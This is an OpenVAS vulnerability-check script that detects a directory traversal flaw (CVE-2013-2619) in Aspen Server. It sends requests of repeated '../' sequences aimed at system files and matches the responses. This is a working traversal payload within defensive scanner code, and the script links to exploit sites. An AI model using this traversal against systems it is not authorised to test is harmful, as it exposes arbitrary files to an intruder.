##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_aspen_server_dir_trav_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Aspen Sever Directory Traversal Vulnerability
#
# Authors:
# Arun Kallavi <karun@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application.
  Impact Level: Application";
tag_affected = "Aspen Server version 0.8 and prior";


tag_insight = "The flaw is due to the program not properly sanitizing user supplied input.";
tag_solution = "Upgrade to Aspen Server 0.22 or later,
  For updates refer to http://aspen.io";
tag_summary = "This host is running Aspen Server and is prone to directory
  traversal vulnerability.";

if(description)
{
  script_id(803367);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2013-2619");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-04-04 12:47:57 +0530 (Thu, 04 Apr 2013)");
  script_name("Aspen Sever Directory Traversal Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_description(desc);
  script_xref(name : "URL" , value : "http://osvdb.org/91895");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/24915");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/121035");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/aspen-08-directory-traversal");
  script_summary("Check if Aspen Server is vulnerable to directory traversal");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_require_ports("Services/www", 8080);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
url = "";
port = "";
files = "";
banner = "";

## Get HTTP Port
port = get_http_port(default:8080);
if(!port){
  port = 8080;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Get the banner and confirm the application
banner = get_http_banner(port:port);

if("Server: Aspen" >< banner)
{
  files = traversal_files();

  foreach file (keys(files))
  {
    ## Construct directory traversal attack
    url = "/" + crap(data:"../",length:15) + files[file];

    ## Confirm exploit worked properly or not
    if(http_vuln_check(port:port, url:url, pattern:file))
    {
      security_hole(port:port);
      exit(0);
    }
  }
}
